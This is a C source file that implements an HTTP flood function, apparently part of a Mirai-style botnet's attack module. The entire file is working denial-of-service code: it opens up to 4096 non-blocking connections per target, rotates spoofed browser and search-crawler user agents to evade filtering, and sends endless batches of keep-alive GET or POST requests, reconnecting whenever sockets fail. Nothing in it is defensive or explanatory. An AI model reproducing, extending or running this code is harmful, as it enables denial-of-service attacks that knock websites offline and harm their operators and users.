#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <poll.h>
#include <sys/socket.h>
#include <time.h>

#include "includes.h"
#include "attack.h"

#define MAX_CONNS 4096
#define REQ_BATCH 5
#define REQ_LIMIT 500

// User agent list for randomization in HTTP requests
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:125.0) Gecko/20100101 Firefox/125.0",
    "curl/8.1.2",
    "Wget/1.21.1 (linux-gnu)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
};
#define UA_COUNT (sizeof(user_agents) / sizeof(user_agents[0]))

// Set socket to non-blocking mode
static int set_nonblocking(int fd)
{
    return fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
}

// Attempt to connect to a target
static int try_connect(struct attack_target *targ, int port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return -1;

    set_nonblocking(sock);
    targ->sock_addr.sin_port = htons(port);
    connect(sock, (struct sockaddr *)&targ->sock_addr, sizeof(struct sockaddr_in));
    return sock;
}

void attack_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    srand(time(NULL));

    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char domain_buf[INET_ADDRSTRLEN];
    if (domain == NULL)
    {
        if (targs_len == 0)
            return;
        if (!inet_ntop(AF_INET, &targs[0].sock_addr.sin_addr, domain_buf, sizeof(domain_buf)))
            return;
        domain = domain_buf;
    }

    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    BOOL https = attack_get_opt_int(opts_len, opts, ATK_OPT_HTTPS, FALSE);
    if (https)
        return;

    int conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 100);
    int port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    int total_conns = conns * targs_len;
    if (total_conns > MAX_CONNS)
        total_conns = MAX_CONNS;

    struct pollfd *pfds = calloc(total_conns, sizeof(struct pollfd));
    int *sockets = calloc(total_conns, sizeof(int));
    int *target_indices = calloc(total_conns, sizeof(int));
    int *req_counts = calloc(total_conns, sizeof(int));
    char *state = calloc(total_conns, sizeof(char)); // 0 = connecting, 1 = connected

    if (!pfds || !sockets || !target_indices || !state || !req_counts)
        return;

    // Create and initialize sockets
    for (int i = 0, s = 0; i < targs_len; i++) {
        for (int j = 0; j < conns && s < total_conns; j++, s++) {
            target_indices[s] = i;
            sockets[s] = try_connect(&targs[i], port);
            pfds[s].fd = sockets[s];
            pfds[s].events = POLLOUT;
            req_counts[s] = 0;
            state[s] = 0;
        }
    }

    while (TRUE)
    {
        int ret = poll(pfds, total_conns, 50);
        if (ret <= 0) continue;

        for (int i = 0; i < total_conns; i++)
        {
            if (pfds[i].fd < 0) continue;

            // Handle broken socket
            if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL))
            {
                close(pfds[i].fd);
                int t = target_indices[i];
                sockets[i] = try_connect(&targs[t], port);
                pfds[i].fd = sockets[i];
                pfds[i].events = POLLOUT;
                state[i] = 0;
                req_counts[i] = 0;
                continue;
            }

            if (pfds[i].revents & POLLOUT)
            {
                // Build HTTP request
                const char *ua = user_agents[rand() % UA_COUNT];
                char req[512];

                if (strcmp(method, "POST") == 0 && postdata != NULL)
                {
                    snprintf(req, sizeof(req),
                             "POST %s HTTP/1.1\r\n"
                             "Host: %s\r\n"
                             "User-Agent: %s\r\n"
                             "Connection: keep-alive\r\n"
                             "Content-Length: %d\r\n\r\n"
                             "%s",
                             path, domain, ua, strlen(postdata), postdata);
                }
                else
                {
                    snprintf(req, sizeof(req),
                             "GET %s HTTP/1.1\r\n"
                             "Host: %s\r\n"
                             "User-Agent: %s\r\n"
                             "Connection: keep-alive\r\n\r\n",
                             path, domain, ua);
                }

                for (int j = 0; j < REQ_BATCH && req_counts[i] < REQ_LIMIT; j++)
                {
                    ssize_t sent = send(pfds[i].fd, req, strlen(req), MSG_NOSIGNAL | MSG_DONTWAIT);
                    if (sent <= 0)
                    {
                        if (errno == EAGAIN || errno == EWOULDBLOCK)
                            continue;

                        close(pfds[i].fd);
                        int t = target_indices[i];
                        sockets[i] = try_connect(&targs[t], port);
                        pfds[i].fd = sockets[i];
                        pfds[i].events = POLLOUT;
                        req_counts[i] = 0;
                        state[i] = 0;
                        break;
                    }

                    req_counts[i]++;
                }

                // Drain response (if any)
                char buf[1024];
                while (recv(pfds[i].fd, buf, sizeof(buf), MSG_DONTWAIT) > 0);

                // Reconnect if over request limit
                if (req_counts[i] >= REQ_LIMIT)
                {
                    close(pfds[i].fd);
                    int t = target_indices[i];
                    sockets[i] = try_connect(&targs[t], port);
                    pfds[i].fd = sockets[i];
                    pfds[i].events = POLLOUT;
                    req_counts[i] = 0;
                    state[i] = 0;
                }
            }
        }
    }

    // Cleanup (unreachable)
    for (int i = 0; i < total_conns; i++)
        if (pfds[i].fd >= 0) close(pfds[i].fd);
    free(pfds);
    free(sockets);
    free(target_indices);
    free(state);
    free(req_counts);
}
